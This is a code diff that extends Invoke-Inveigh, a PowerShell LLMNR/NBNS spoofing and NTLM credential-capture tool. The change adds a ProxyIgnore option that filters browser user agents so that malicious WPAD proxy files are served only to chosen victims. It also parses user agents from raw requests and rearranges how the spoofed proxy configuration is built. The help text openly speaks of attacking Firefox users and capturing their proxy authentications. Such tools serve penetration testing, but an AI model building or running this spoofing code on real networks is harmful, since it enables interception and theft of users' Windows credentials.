@@ -16,6 +16,10 @@ Invoke-Inveigh is a Windows PowerShell LLMNR/NBNS spoofer with the following fea
     Run time and run count control
     LLMNR/NBNS spoofer learning mode
 
+.PARAMETER ElevatedPrivilege
+Default = Auto: (Auto,Y,N) Set the privilege mode. Auto will determine if Inveigh is running with
+elevated privilege. If so, options that require elevated privilege can be used. 
+
 .PARAMETER IP
 Specific local IP address for listening. This IP address will also be used for LLMNR/NBNS spoofing if the
 SpooferIP parameter is not set.
@@ -170,6 +174,14 @@ Default = Any: IP address for the proxy listener.
 .PARAMETER ProxyPort
 Default = 8492: TCP port for the proxy listener.
 
+.PARAMETER ProxyIgnore
+Default = Firefox: Comma separated list of keywords to use for filtering browser user agents. Matching browsers
+will not be sent the wpad.dat file used for capturing proxy authentications. Firefox does not work correctly
+with the proxy server failover setup. Firefox will be left unable to connect to any sites until the proxy is
+cleared. Remove "Firefox" from this list to attack Firefox. If attacking Firefox, consider setting
+-SpooferRepeat N to limit attacks against a single target so that victims can recover Firefox connectivity by
+closing and reopening. 
+
 .PARAMETER SMB
 Default = Enabled: (Y/N) Enable/Disable SMB challenge/response capture. Warning, LLMNR/NBNS spoofing can still
 direct targets to the host system's SMB server. Block TCP ports 445/139 or kill the SMB services if you need to
@@ -317,6 +329,7 @@ param
     [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$HTTPDir = "",
     [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$OutputDir = "",
     [parameter(Mandatory=$false)][ValidatePattern('^[A-Fa-f0-9]{16}$')][String]$Challenge = "",
+    [parameter(Mandatory=$false)][Array]$ProxyIgnore = "Firefox",
     [parameter(Mandatory=$false)][Array]$SpooferHostsReply = "",
     [parameter(Mandatory=$false)][Array]$SpooferHostsIgnore = "",
     [parameter(Mandatory=$false)][Array]$SpooferIPsReply = "",
@@ -514,6 +527,8 @@ if(!$elevated_privilege)
         Write-Output "Error:-SpooferLearning requires elevated privileges"
         throw
     }
+
+    $SMB = "N"
 
 }
 
@@ -823,14 +838,7 @@ if($HTTPS -eq 'Y')
                 $inveigh.status_queue.Add("HTTPS Capture = Using Existing Certificate")  > $null
             }
             
-            #$certificate_check = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -Like "CN=" + $inveigh.certificate_issuer})
-            #$netsh_certhash = "certhash=" + $certificate_check.thumbprint
-            #$netsh_app_ID = "appid={00112233-4455-6677-8899-AABBCCDDEEFF}"
-            #$netsh_arguments = @("http","add","sslcert","ipport=$HTTPIP`:$HTTPSPort",$netsh_certhash,$netsh_app_ID)
-            #& "netsh" $netsh_arguments > $null
             $inveigh.HTTPS = $true
-            #$inveigh.HTTPS_IP = $HTTPIP
-            #$inveigh.HTTPS_port = $HTTPSPort
 
             if($HTTPIP -ne '0.0.0.0')
             { 
@@ -892,25 +900,17 @@ if($HTTP -eq 'Y' -or $HTTPS -eq 'Y')
         $inveigh.status_queue.Add("Basic Authentication Realm = $HTTPBasicRealm")  > $null
     }
 
-    if($WPADDirectHosts)
-    {
-        ForEach($WPAD_direct_host in $WPADDirectHosts)
-        {
-            $WPAD_direct_hosts_function += 'if (dnsDomainIs(host, "' + $WPAD_direct_host + '")) return "DIRECT";'
-        }
-
-        $inveigh.status_queue.Add("WPAD Direct Hosts = " + ($WPADDirectHosts -join ","))  > $null
-    }
-
-    if($WPADResponse)
-    {
-        $inveigh.status_queue.Add("WPAD Custom Response = Enabled")  > $null
-    }
-    elseif($Proxy -eq 'Y')
+    if($Proxy -eq 'Y')
     {
         $inveigh.status_queue.Add("Proxy Capture = Enabled")  > $null
         $inveigh.status_queue.Add("Proxy Authentication = $ProxyAuth")  > $null
         $ProxyPortFailover = $ProxyPort + 1
+        $ProxyIgnore = ($ProxyIgnore | Where-Object {$_ -and $_.Trim()})
+
+        if($ProxyIgnore.Count -gt 0)
+        {
+            $inveigh.status_queue.Add("Proxy Ignored User Agents = " + ($ProxyIgnore -join ","))  > $null
+        }
 
         if($ProxyIP -eq '0.0.0.0')
         {
@@ -926,6 +926,21 @@ if($HTTP -eq 'Y' -or $HTTPS -eq 'Y')
             $WPADResponse = "function FindProxyForURL(url,host){$WPAD_direct_hosts_function return `"PROXY $proxy_WPAD_IP`:$ProxyPort; PROXY $proxy_wpad_IP`:$ProxyPortFailover; DIRECT`";}"
         }
 
+    }
+
+    if($WPADDirectHosts)
+    {
+        ForEach($WPAD_direct_host in $WPADDirectHosts)
+        {
+            $WPAD_direct_hosts_function += 'if (dnsDomainIs(host, "' + $WPAD_direct_host + '")) return "DIRECT";'
+        }
+
+        $inveigh.status_queue.Add("WPAD Direct Hosts = " + ($WPADDirectHosts -join ","))  > $null
+    }
+
+    if($WPADResponse)
+    {
+        $inveigh.status_queue.Add("WPAD Custom Response = Enabled")  > $null
     }
     elseif($WPADIP -and $WPADPort)
     {
@@ -1277,7 +1292,7 @@ $SMB_NTLM_functions_scriptblock =
 # HTTP Server ScriptBlock - HTTP/HTTPS/Proxy listener
 $HTTP_scriptblock = 
 { 
-    param ($Challenge,$HTTPAuth,$HTTPBasicRealm,$HTTPContentType,$HTTPIP,$HTTPPort,$HTTPDefaultEXE,$HTTPDefaultFile,$HTTPDir,$HTTPResponse,$HTTPS_listener,$proxy_listener,$WPADAuth,$WPADResponse)
+    param ($Challenge,$HTTPAuth,$HTTPBasicRealm,$HTTPContentType,$HTTPIP,$HTTPPort,$HTTPDefaultEXE,$HTTPDefaultFile,$HTTPDir,$HTTPResponse,$HTTPS_listener,$ProxyIgnore,$proxy_listener,$WPADAuth,$WPADResponse)
 
     function NTLMChallengeBase64
     {
@@ -1502,6 +1517,24 @@ $HTTP_scriptblock =
             {
                 $inveigh.console_queue.Add("$(Get-Date -format 's') - $HTTP_type request for $HTTP_request_raw_URL received from $HTTP_source_IP")
                 $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type request for $HTTP_request_raw_URL received from $HTTP_source_IP")])
+
+                if($TCP_request -like "*-55-73-65-72-2D-41-67-65-6E-74-3A-20-*")
+                {
+                    $HTTP_user_agent = $TCP_request.Substring($TCP_request.IndexOf("-55-73-65-72-2D-41-67-65-6E-74-3A-20-") + 36)
+                    $HTTP_user_agent = $HTTP_user_agent.Substring(0,$HTTP_user_agent.IndexOf("-0D-0A-"))
+                    $HTTP_user_agent = $HTTP_user_agent.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
+                    $user_agent = New-Object System.String ($HTTP_user_agent,0,$HTTP_user_agent.Length)
+                    $inveigh.console_queue.Add("$(Get-Date -format 's') - $HTTP_type user agent $user_agent from $HTTP_source_IP")
+                    $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type user agent $user_agent from $HTTP_source_IP")])
+
+                    if($ProxyIgnore.Count -gt 0 -and ($ProxyIgnore | ForEach-Object{$user_agent.contains($_)}))
+                    {
+                        $inveigh.console_queue.Add("$(Get-Date -format 's') - $HTTP_type ignoring wpad.dat request from $HTTP_source_IP")
+                        $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - $HTTP_type ignoring wpad.dat request from $HTTP_source_IP")])
+                    }
+
+                }
+
             }
 
             if($authentication_header.startswith('NTLM '))
@@ -1716,7 +1749,7 @@ $HTTP_scriptblock =
                 else
                 {
                 
-                    if($HTTP_request_raw_url -match '/wpad.dat')
+                    if($HTTP_request_raw_url -match '/wpad.dat' -and (!$ProxyIgnore -or !($ProxyIgnore | ForEach-Object{$user_agent.contains($_)})))
                     {
                         $HTTP_message = $WPADResponse
                         $HTTP_content_type_header = 0x43,0x6f,0x6e,0x74,0x65,0x6e,0x74,0x2d,0x54,0x79,0x70,0x65,0x3a,0x20 + [System.Text.Encoding]::UTF8.GetBytes("application/x-ns-proxy-autoconfig") + 0x0d,0x0a
@@ -2996,8 +3029,8 @@ function HTTPListener()
     $HTTP_powershell.AddScript($HTTP_scriptblock).AddArgument($Challenge).AddArgument($HTTPAuth).AddArgument(
         $HTTPBasicRealm).AddArgument($HTTPContentType).AddArgument($HTTPIP).AddArgument($HTTPPort).AddArgument(
         $HTTPDefaultEXE).AddArgument($HTTPDefaultFile).AddArgument($HTTPDir).AddArgument(
-        $HTTPResponse).AddArgument($HTTPS_listener).AddArgument($proxy_listener).AddArgument(
-        $WPADAuth).AddArgument($WPADResponse) > $null
+        $HTTPResponse).AddArgument($HTTPS_listener).AddArgument($ProxyIgnore).AddArgument(
+        $proxy_listener).AddArgument($WPADAuth).AddArgument($WPADResponse) > $null
     $HTTP_powershell.BeginInvoke() > $null
 }
 
@@ -3017,8 +3050,8 @@ function HTTPSListener()
     $HTTPS_powershell.AddScript($HTTP_scriptblock).AddArgument($Challenge).AddArgument($HTTPAuth).AddArgument(
         $HTTPBasicRealm).AddArgument($HTTPContentType).AddArgument($HTTPIP).AddArgument($HTTPSPort).AddArgument(
         $HTTPDefaultEXE).AddArgument($HTTPDefaultFile).AddArgument($HTTPDir).AddArgument(
-        $HTTPResponse).AddArgument($HTTPS_listener).AddArgument($proxy_listener).AddArgument(
-        $WPADAuth).AddArgument($WPADResponse) > $null
+        $HTTPResponse).AddArgument($HTTPS_listener).AddArgument($ProxyIgnore).AddArgument(
+        $proxy_listener).AddArgument($WPADAuth).AddArgument($WPADResponse) > $null
     $HTTPS_powershell.BeginInvoke() > $null
 }
 
@@ -3038,8 +3071,8 @@ function ProxyListener()
     $proxy_powershell.AddScript($HTTP_scriptblock).AddArgument($Challenge).AddArgument($HTTPAuth).AddArgument(
         $HTTPBasicRealm).AddArgument($HTTPContentType).AddArgument($ProxyIP).AddArgument($ProxyPort).AddArgument(
         $HTTPDefaultEXE).AddArgument($HTTPDefaultFile).AddArgument($HTTPDir).AddArgument(
-        $HTTPResponse).AddArgument($HTTPS_listener).AddArgument($proxy_listener).AddArgument(
-        $WPADAuth).AddArgument($WPADResponse) > $null
+        $HTTPResponse).AddArgument($HTTPS_listener).AddArgument($ProxyIgnore).AddArgument(
+        $proxy_listener).AddArgument($WPADAuth).AddArgument($WPADResponse) > $null
     $proxy_powershell.BeginInvoke() > $null
 }
 
